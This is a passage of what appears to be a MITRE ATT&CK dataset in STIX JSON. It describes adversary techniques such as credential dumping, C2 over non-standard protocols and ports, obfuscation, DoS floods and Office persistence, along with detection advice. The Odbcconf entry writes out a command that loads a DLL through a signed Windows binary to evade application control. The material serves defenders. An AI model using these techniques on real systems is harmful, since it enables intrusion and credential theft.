devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Network interface access and packet capture driver\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:45.613Z\",\"external_references\":[{\"external_id\":\"T1050\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1050\"},{\"external_id\":\"CAPEC-550\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/550.html\"},{\"description\":\"Microsoft. (n.d.). Services. Retrieved June 7, 2016.\",\"source_name\":\"TechNet Services\",\"url\":\"https://technet.microsoft.com/en-us/library/cc772408.aspx\"},{\"description\":\"Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.\",\"source_name\":\"Microsoft 4697 APR 2017\",\"url\":\"https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697\"},{\"description\":\"Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.\",\"source_name\":\"Microsoft Windows Event Forwarding FEB 2018\",\"url\":\"https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--478aa214-2ca7-4ec0-9978-18798e514790\",\"modified\":\"2020-03-17T16:21:36.413Z\",\"name\":\"New Service\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2017-05-31T21:31:10.728Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\\n\\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\",\"external_references\":[{\"external_id\":\"T1095\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1095\"},{\"description\":\"Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved December 4, 2014.\",\"source_name\":\"Wikipedia OSI\",\"url\":\"http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29\"},{\"description\":\"Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics. Retrieved December 1, 2014.\",\"source_name\":\"Microsoft ICMP\",\"url\":\"http://support.microsoft.com/KB/170292\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-11T15:09:26.624Z\",\"name\":\"Non-Application Layer Protocol\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ryan Becwar\"],\"x_mitre_data_sources\":[\"Host network interface\",\"Netflow/Enclave netflow\",\"Network intrusion detection system\",\"Network protocol analysis\",\"Packet capture\",\"Process use of network\"],\"x_mitre_detection\":\"Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\\n\\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Windows\",\"Linux\",\"macOS\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2020-03-14T23:39:50.117Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) \",\"external_references\":[{\"external_id\":\"T1132.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1132/002\"},{\"description\":\"Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.\",\"source_name\":\"Wikipedia Binary-to-text Encoding\",\"url\":\"https://en.wikipedia.org/wiki/Binary-to-text_encoding\"},{\"description\":\"Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.\",\"source_name\":\"Wikipedia Character Encoding\",\"url\":\"https://en.wikipedia.org/wiki/Character_encoding\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-14T23:39:50.117Z\",\"name\":\"Non-Standard Encoding\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-14T18:18:32.443Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\",\"external_references\":[{\"external_id\":\"T1571\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1571\"},{\"description\":\"Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019.\",\"source_name\":\"Symantec Elfin Mar 2019\",\"url\":\"https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage\"},{\"description\":\"Zhang, X. (2018, April 05). Analysis of New Agent Tesla Spyware Variant. Retrieved November 5, 2018.\",\"source_name\":\"Fortinet Agent Tesla April 2018\",\"url\":\"https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T22:02:25.221Z\",\"name\":\"Non-Standard Port\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:19.735Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\\n\\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\\n\",\"external_references\":[{\"external_id\":\"T1003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003\"},{\"description\":\"French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting Attempts to Steal Passwords from Memory\",\"url\":\"https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea\"},{\"description\":\"PowerSploit. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Powersploit\",\"url\":\"https://github.com/mattifestation/PowerSploit\"},{\"description\":\"Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.\",\"source_name\":\"Microsoft DRSR Dec 2017\",\"url\":\"https://msdn.microsoft.com/library/cc228086.aspx\"},{\"description\":\"Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.\",\"source_name\":\"Microsoft GetNCCChanges\",\"url\":\"https://msdn.microsoft.com/library/dd207691.aspx\"},{\"description\":\"SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.\",\"source_name\":\"Samba DRSUAPI\",\"url\":\"https://wiki.samba.org/index.php/DRSUAPI\"},{\"description\":\"Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.\",\"source_name\":\"Harmj0y DCSync Sept 2015\",\"url\":\"http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/\"},{\"description\":\"Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.\",\"source_name\":\"Microsoft NRPC Dec 2017\",\"url\":\"https://msdn.microsoft.com/library/cc237008.aspx\"},{\"description\":\"Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.\",\"source_name\":\"Microsoft SAMR\",\"url\":\"https://msdn.microsoft.com/library/cc245496.aspx\"},{\"description\":\"Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.\",\"source_name\":\"AdSecurity DCSync Sept 2015\",\"url\":\"https://adsecurity.org/?p=1729\"}],\"id\":\"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-06-09T20:46:00.758Z\",\"name\":\"OS Credential Dumping\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Vincent Le Toux\",\"Ed Williams, Trustwave, SpiderLabs\"],\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"PowerShell logs\",\"Process command-line parameters\"],\"x_mitre_detection\":\"### Windows\\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\\n\\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well. \\n\\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\\n\\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1086) scripts also exist that contain credential dumping functionality, such as PowerSploit\'s Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\\n\\nMonitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)\\n\\n### Linux\\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/<pid>/maps</code>, where the <code><pid></code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Windows\",\"Linux\",\"macOS\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2020-02-20T15:27:18.581Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may target the operating system (OS) for a DoS attack, since the (OS) is responsible for managing the finite resources on a system. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity.\\n\\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\\n\\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)\",\"external_references\":[{\"external_id\":\"T1499.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1499/001\"},{\"description\":\"Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor\'s 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.\",\"source_name\":\"Arbor AnnualDoSreport Jan 2018\",\"url\":\"https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf\"},{\"description\":\"Cloudflare. (n.d.). What is a SYN flood attack?. Retrieved April 22, 2019.\",\"source_name\":\"Cloudflare SynFlood\",\"url\":\"https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/\"},{\"description\":\"Corero. (n.d.). What is a SYN-ACK Flood Attack?. Retrieved April 22, 2019.\",\"source_name\":\"Corero SYN-ACKflood\",\"url\":\"https://www.corero.com/resources/ddos-attack-types/syn-flood-ack.html\"},{\"description\":\"Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.\",\"source_name\":\"Cisco DoSdetectNetflow\",\"url\":\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\"}],\"id\":\"attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-29T01:43:29.320Z\",\"name\":\"OS Exhaustion Flood\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network device logs\",\"Netflow/Enclave netflow\",\"Network intrusion detection system\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:32.662Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \\n\\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user\'s action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \\n\\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) \",\"external_references\":[{\"external_id\":\"T1027\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1027\"},{\"external_id\":\"CAPEC-267\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/267.html\"},{\"description\":\"Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.\",\"source_name\":\"Volexity PowerDuke November 2016\",\"url\":\"https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/\"},{\"description\":\"Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.\",\"source_name\":\"Linux/Cdorked.A We Live Security Analysis\",\"url\":\"https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/\"},{\"description\":\"Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.\",\"source_name\":\"Carbon Black Obfuscation Sept 2016\",\"url\":\"https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/\"},{\"description\":\"Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.\",\"source_name\":\"FireEye Obfuscation June 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html\"},{\"description\":\"Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.\",\"source_name\":\"FireEye Revoke-Obfuscation July 2017\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf\"},{\"description\":\"White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.\",\"source_name\":\"PaloAlto EncodedCommand March 2017\",\"url\":\"https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/\"},{\"description\":\"Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.\",\"source_name\":\"GitHub Revoke-Obfuscation\",\"url\":\"https://github.com/danielbohannon/Revoke-Obfuscation\"},{\"description\":\"Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.\",\"source_name\":\"GitHub Office-Crackros Aug 2016\",\"url\":\"https://github.com/itsreallynick/office-crackros\"}],\"id\":\"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:14:08.350Z\",\"name\":\"Obfuscated Files or Information\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Red Canary\",\"Christiaan Beek, @ChristiaanBeek\"],\"x_mitre_data_sources\":[\"Network protocol analysis\",\"Process use of network\",\"File monitoring\",\"Malware reverse engineering\",\"Binary file metadata\",\"Process command-line parameters\",\"Environment variable\",\"Process monitoring\",\"Windows event logs\",\"Network intrusion detection system\",\"Email gateway\",\"SSL/TLS inspection\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\",\"Signature-based detection\",\"Host intrusion prevention systems\",\"Application control\",\"Log analysis\",\"Application control by file name or path\"],\"x_mitre_detection\":\"Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \\n\\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like \'\'\'^\'\'\' and \'\'\'\\\"\'\'\'. Windows\' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \\n\\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \\n\\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. \",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-01-24T15:01:32.917Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) Odbcconf.exe is digitally signed by Microsoft.\\n\\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \\\"C:\\\\Users\\\\Public\\\\file.dll\\\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) \\n\",\"external_references\":[{\"external_id\":\"T1218.008\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/008\"},{\"description\":\"Microsoft. (2017, January 18). ODBCCONF.EXE. Retrieved March 7, 2019.\",\"source_name\":\"Microsoft odbcconf.exe\",\"url\":\"https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017\"},{\"description\":\"LOLBAS. (n.d.). Odbcconf.exe. Retrieved March 7, 2019.\",\"source_name\":\"LOLBAS Odbcconf\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\"},{\"description\":\"Bermejo, L., Giagone, R., Wu, R., and Yarochkin, F. (2017, August 7). Backdoor-carrying Emails Set Sights on Russian-speaking Businesses. Retrieved March 7, 2019.\",\"source_name\":\"TrendMicro Squiblydoo Aug 2017\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/\"},{\"description\":\"Giagone, R., Bermejo, L., and Yarochkin, F. (2017, November 20). Cobalt Strikes Again: Spam Runs Use Macros and CVE-2017-8759 Exploit Against Russian Banks. Retrieved March 7, 2019.\",\"source_name\":\"TrendMicro Cobalt Group Nov 2017\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/\"}],\"id\":\"attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:39:00.717Z\",\"name\":\"Odbcconf\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Loaded DLLs\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Digital Certificate Validation\",\"Application control\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\\n\\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)\",\"external_references\":[{\"external_id\":\"T1137\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1137\"},{\"description\":\"SensePost. (2016, August 18). Ruler: A tool to abuse Exchange services. Retrieved February 4, 2019.\",\"source_name\":\"SensePost Ruler GitHub\",\"url\":\"https://github.com/sensepost/ruler\"},{\"description\":\"Koeller, B.. (2018, February 21). Defending Against Rules and Forms Injection. Retrieved November 5, 2019.\",\"source_name\":\"TechNet O365 Outlook 